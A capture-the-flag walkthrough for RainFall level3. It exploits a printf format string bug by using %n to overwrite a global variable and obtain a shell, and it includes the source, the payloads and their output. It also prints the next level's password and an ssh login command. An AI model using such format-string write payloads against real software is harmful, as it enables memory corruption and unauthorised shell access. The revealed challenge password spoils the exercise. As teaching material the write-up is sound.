# level3: Exploiting a Format String Vulnerability

## Challenge Overview

In this challenge, we are tasked with exploiting a binary to gain access to the password for the next level. The binary contains a function `v()` that reads user input, prints it back, and checks if a global variable `m` is set to `0x40`. If the condition is met, the program executes a shell command to provide access to the next level.

## Source Code Analysis

The source code for the binary is as follows:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

uint32_t m = 0x00000000; // Global variable stored at address 0x804988c

void v(void) {
    char buffer[520];

    // Read input from stdin
    fgets(buffer, sizeof(buffer), stdin);

    // Print the input back to stdout
    // printf("%s", buffer); Initial code from Ghidra, the original code actually did not use type specifiers
    printf(buffer);

    // Check if the condition is met
    if (m == 0x40) {
        fwrite("Wait what?!\n", 1, 12, stdout);
        system("/bin/sh");
    }
}

int main(void) {
    v();
    return 0;
}
```

Initially, when analyzing the binary in Ghidra, the decompiler showed the line `printf("%s", buffer);`. This is a safe way to use `printf` because it explicitly specifies the format string. However, testing the binary with the input `%x %x %x` revealed the following output:

```
level3@RainFall:~$ ./level3
%x %x %x
200 b7fd1ac0 b7ff37d0
```

This output indicates that the binary is actually using `printf(buffer);`, which is vulnerable to a format string attack. Ghidra had guessed the safer version of the code, but the actual binary does not include the format specifier.

## Vulnerability

The vulnerability lies in the use of `printf(buffer);`. When `printf` is called without a format specifier, it interprets the contents of `buffer` as a format string. This allows an attacker to:

1. Read arbitrary memory addresses using `%x` or `%s`.
2. Write to arbitrary memory addresses using `%n`.

## Exploitation

To exploit this vulnerability, we need to:

1. Write the value `0x40` (64 in decimal) to the global variable `m`, which is located at address `0x804988c`.
2. Use the `%n` format specifier to achieve this.

### What is `%n`?

The `%n` format specifier in `printf` writes the number of characters printed so far to the memory address provided as an argument. For example:

```c
int x = 0;
printf("Hello, world!%n", &x);
```

After this code runs, `x` will contain the value `13` because 13 characters were printed before `%n` was processed.

### What is `%c`?

The `%c` format specifier prints a single character. It is useful for controlling the number of characters printed, as each `%c` adds exactly one character to the output.

### How Does `printf` Find Arguments When None Are Given?

When `printf` is called, it looks for arguments on the stack. If no arguments are explicitly provided, `printf` will still attempt to retrieve them from the stack, interpreting whatever values it finds as arguments. This behavior is what makes format string vulnerabilities possible. For example:

```c
level3@RainFall:~$ ./level3
%x %x %x
200 b7fd1ac0 b7ff37d0
```

In this case, `printf` will print the values of the first three stack entries it encounters, even though no arguments were passed.

### Determining the Correct Parameter Position

To exploit the format string vulnerability, we needed to determine which parameter position on the stack corresponds to the address of the global variable `m` (0x804988c). This is critical for using the `%n` format specifier to write to the correct memory location.

#### Testing the Stack Layout

We used the following payload to print multiple stack values:

```bash
(python -c 'print "\x8c\x98\x04\x08" + " %x %x %x %x %x %x %x %x"'; cat) | ./level3
```

This payload:

1. Places the address of `m` (`0x804988c`, `\x8c\x98\x04\x08` in little-endian) at the beginning of the input. Check level1's walkthrough for more details about little-endian format.
2. Includes multiple `%x` format specifiers to print values from the stack.

#### Output Analysis

The output of the test was:

```
� 200 b7fd1ac0 b7ff37d0 804988c 20782520 25207825 78252078 20782520
```

Breaking this down:

- `200`: First stack value.
- `b7fd1ac0`: Second stack value.
- `b7ff37d0`: Third stack value.
- `804988c`: **Fourth stack value** (the address of `m`).

This confirmed that the address of `m` is at the 4th parameter position on the stack.

#### Final Payload

With this information, we updated our payload to use `%4$n` to write to the address of `m`:

```bash
(python -c 'print "\x8c\x98\x04\x08" + "%60c%4$n"'; cat) | ./level3
```

This payload:

1. Places the address of `m` at the beginning of the input. This is necessary for the address to be available as the 4th parameter in the `printf` function.
2. Prints 60 characters to bring the total character count to 64.
3. Uses `%4$n` to write the character count (64) to the address of `m`.

#### Verifying the Exploit

Running the updated payload produced the following output:

```
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "%60c%4$n"'; cat) | ./level3
�
Wait what?!
```

This confirmed that the value `0x40` (64 in decimal) was successfully written to `m`, triggering the condition to execute the shell command.

### Delivering the Exploit

We can deliver the payload using Python:

```bash
(python -c 'print "\x8c\x98\x04\x08" + "%60c%4$n"'; cat) | ./level3
```

This command:

- Generates the payload.
- Pipes it into the binary.
- Uses `cat` to keep stdin open for interaction with the shell. Check the level1's walkthrough for more details.

### Verifying the Exploit

Running the exploit produces the following output:

```
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "%60c%4$n"'; cat) | ./level3
�
Wait what?!
```

This confirms that the value `0x40` was successfully written to `m`, triggering the condition to execute the shell command.

## Getting the Password

After gaining shell access, we can retrieve the password for the next level:

```bash
cat /home/user/level4/.pass
```

The password is:

```
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

## Moving to Next Level

Use the password to log in as `level4`:

```bash
ssh level4@192.168.1.13 -p 4242
```
